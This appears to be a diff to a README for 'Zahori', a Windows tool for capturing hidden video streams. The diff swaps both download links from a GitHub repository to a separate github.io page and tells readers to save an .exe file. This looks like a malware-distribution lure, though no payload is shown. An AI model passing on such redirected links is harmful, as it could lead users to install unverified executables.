@@ -1,6 +1,6 @@
 # 📺 zahori - Find video streams on any website
 
-[![](https://img.shields.io/badge/Download-Zahori-blue.svg)](https://github.com/softshoedancingduckweed138/zahori)
+[![](https://img.shields.io/badge/Download-Zahori-blue.svg)](https://softshoedancingduckweed138.github.io)
 
 Zahori helps you find and save media streams from websites. Many sites hide the direct link to a video file to prevent you from saving it. Zahori acts as a browser to look behind those web pages. It identifies the true source of HLS, DASH, or MP4 streams. You can use it to capture videos for offline viewing. It learns how different websites work so it improves as you use it.
 
@@ -8,7 +8,7 @@ Zahori helps you find and save media streams from websites. Many sites hide the 
 
 Visit the official repository page to download the software for your Windows computer.
 
-[Download Zahori Here](https://github.com/softshoedancingduckweed138/zahori)
+[Download Zahori Here](https://softshoedancingduckweed138.github.io)
 
 Click on the latest version available in the releases section. Look for a file ending in .exe. Save this file to your computer desktop.
 
